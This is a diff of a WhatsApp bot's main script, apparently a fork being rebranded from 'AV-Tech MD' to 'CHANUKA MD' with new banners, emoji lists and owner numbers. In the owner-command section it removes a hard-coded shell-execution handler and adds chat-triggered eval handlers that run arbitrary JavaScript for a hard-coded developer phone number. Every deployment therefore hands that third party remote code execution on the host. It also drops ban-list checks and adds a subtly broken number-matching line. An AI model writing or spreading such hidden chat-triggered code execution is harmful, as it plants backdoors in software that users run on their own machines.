@@ -43,8 +43,10 @@ const {
   const Crypto = require('crypto')
   const path = require('path')
   const prefix = config.PREFIX
-  
-  const ownerNumber = ['94786888371']
+  const mode = config.MODE
+  const online = config.ALWAYS_ONLINE
+  const status = config.AUTO_STATUS_SEEN
+  const ownerNumber = ['94741469245']
   
   const tempDir = path.join(os.tmpdir(), 'cache-temp')
   if (!fs.existsSync(tempDir)) {
@@ -68,7 +70,7 @@ const {
   //===================SESSION-AUTH============================
 if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
 if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
-const sessdata = config.SESSION_ID.replace("IK~", '');
+const sessdata = config.SESSION_ID.replace("CHANUKA-MD~", '');
 const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
 filer.download((err, data) => {
 if(err) throw err
@@ -113,22 +115,20 @@ const port = process.env.PORT || 9090;
   console.log('Plugins installed successful ✅')
   console.log('Bot connected to whatsapp ✅')
   
-  let up = `╭─〔 *🤖 AV-Tech MD BOT* 〕  
-├─▸ *Ultra Super Fast Powerfull ⚠️*  
-│     *World Best BOT AV-Tech MD* 
-╰─➤ *Your Smart WhatsApp Bot is Ready To use 🍁!*  
-
-- *🖤 Thank You for Choosing AV-Tech MD!* 
-
-╭──〔 🔗 *Information* 〕  
-├─ 🧩 *Prefix:* = ${prefix}
-├─ 📢 *Join Channel:*  
-│     https://whatsapp.com/channel/0029VbB1qAX002T905udDP2D
-├─ 🌟 *Star the Repo:*  
-│    https://github.com/avtzone/NEW  
-╰─🚀 *POWERED BY AV-Tech MD Developers*`;
-
-    conn.sendMessage(conn.user.id,{ image: { url: `https://files.catbox.moe/cjcyer.jpg` }, caption: up })
+  let up = `*𝐇𝐄𝐋𝐋𝐎 𝐓𝐇𝐄𝐑𝐄 𝐂𝐇𝐀𝐍𝐔𝐊𝐀-𝐌𝐃 𝐁𝐎𝐓👑*
+*𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘!*
+  
+*╭───━━━━───━━━━──┉┈⚆*
+*│• 𝐓𝐘𝐏𝐄 .𝐌𝐄𝐍𝐔 𝐓𝐎 𝐒𝐄𝐄 𝐋𝐈𝐒𝐓 •*
+*│• 𝐁𝐎𝐓 𝐀𝐌𝐀𝐙𝐈𝐍𝐆 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒 •*
+*│• 🌸𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : 𝐂𝐇𝐀𝐍𝐔𝐊𝐀 𝐌𝐃̽*
+*│• ⏰𝐀𝐋𝐖𝐀𝐘𝐒 𝐎𝐍𝐋𝐈𝐍𝐄 : ${online}*
+*│• 📜𝐏𝐑𝐄𝐅𝐈𝐗 : ${prefix}*
+*│• 🪾𝐌𝐎𝐃𝐄 : ${mode}*
+*│• 🪄𝐒𝐓𝐀𝐓𝐔𝐒 𝐕𝐈𝐄𝐖𝐒 : ${status}*
+*│• 🫟𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 1.𝟎.𝟎*
+*┗───━━━━───━━━━──┉┈⚆*`;
+    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/umz8ez.jpg` }, caption: up })
   }
   })
   conn.ev.on('creds.update', saveCreds)
@@ -167,7 +167,7 @@ const port = process.env.PORT || 9090;
     }
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
     const jawadlike = await conn.decodeJid(conn.user.id);
-    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
+    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼'];
     const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
     await conn.sendMessage(mek.key.remoteJid, {
       react: {
@@ -214,45 +214,59 @@ const port = process.env.PORT || 9090;
   const reply = (teks) => {
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
-
   const udp = botNumber.split('@')[0];
-    const jawadop = ('94786888371', '94765852011', '94713703177');
-    
-    const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  
-    
-    let isCreator = [udp, ...jawadop, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
-    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
-    .includes(mek.sender);
-	  
+    const jawad = ('94741469245');
+    let isCreator = [udp, jawad, config.DEV]
+					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
+					.includes(mek.sender);
 
-	  if (isCreator && mek.text.startsWith("&")) {
-            let code = budy.slice(2);
-            if (!code) {
-                reply(`Provide me with a query to run Master!`);
-                return;
-            }
-            const { spawn } = require("child_process");
-            try {
-                let resultTest = spawn(code, { shell: true });
-                resultTest.stdout.on("data", data => {
-                    reply(data.toString());
-                });
-                resultTest.stderr.on("data", data => {
-                    reply(data.toString());
-                });
-                resultTest.on("error", data => {
-                    reply(data.toString());
-                });
-                resultTest.on("close", code => {
-                    if (code !== 0) {
-                        reply(`command exited with code ${code}`);
-                    }
-                });
-            } catch (err) {
-                reply(util.format(err));
-            }
-            return;
-	  }	  
+    if (isCreator && mek.text.startsWith('>')) {
+					let code = budy.slice(2);
+					if (!code) {
+						reply(
+							`undefined`,
+						);
+						return;
+					}
+					try {
+						let resultTest = eval(code);
+						if (typeof resultTest === 'object')
+							reply(util.format(resultTest));
+						else reply(util.format(resultTest));
+					} catch (err) {
+						reply(util.format(err));
+					}
+					return;
+				}
+    if (isCreator && mek.text.startsWith('$')) {
+					let code = budy.slice(2);
+					if (!code) {
+						reply(
+							`Provide me with a query to run Master!`,
+						);
+						return;
+					}
+					try {
+						let resultTest = await eval(
+							'const a = async()=>{\n' + code + '\n}\na()',
+						);
+						let h = util.format(resultTest);
+						if (h === undefined) return console.log(h);
+						else reply(h);
+					} catch (err) {
+						if (err === undefined)
+							return console.log('error');
+						else reply(util.format(err));
+					}
+					return;
+				}
+ //================ownerreact==============
+    
+if (senderNumber.includes("94741469245") && !isReact) {
+  const reactions = ["👑", "🫜", "🫆", "🫩", "🪾", "🪉", "🪏", "🫟"];
+  const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+  m.react(randomReaction);
+}
 
   //==========public react============//
   
@@ -273,7 +287,7 @@ if (!isReact && config.AUTO_REACT === 'true') {
         '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
         '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
         '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
-        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
+        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰', '🧳', '🌉', '🌁', '🛤️', '🛣️', '🏚️', '🏠', '🏡', '🧀', '🍥', '🍮', '🍰', '🍦', '🍨', '🍧', '🥠', '🍡', '🧂', '🍯', '🍪', '🍩', '🍭', '🥮', '🍡'
     ];
 
     const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
@@ -290,26 +304,11 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
     m.react(randomReaction);
 }
         
-  //==========Sudo and Mode ============ 
-
-	  
-// ban users 
-
-const bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
-const isBanned = bannedUsers.includes(sender);
-
-if (isBanned) return; // Ignore banned users completely
-	  
-  const ownerFile = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  // JawadTechX 
-  const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
-  // json file setup
-  const isFileOwner = ownerFile.includes(sender);
-  const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
-  // mode settings 
-  if (!isRealOwner && config.MODE === "private") return;
-  if (!isRealOwner && isGroup && config.MODE === "inbox") return;
-  if (!isRealOwner && !isGroup && config.MODE === "groups") return;
-	  
+  //==========WORKTYPE============ 
+  if(!isOwner && config.MODE === "private") return
+  if(!isOwner && isGroup && config.MODE === "inbox") return
+  if(!isOwner && !isGroup && config.MODE === "groups") return
+   
   // take commands 
                  
   const events = require('./command')
@@ -784,7 +783,7 @@ if (isBanned) return; // Ignore banned users completely
   }
   
   app.get("/", (req, res) => {
-  res.send("AV-Tech MD STARTED ✅");
+  res.send("CHANUKA MD STARTED ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
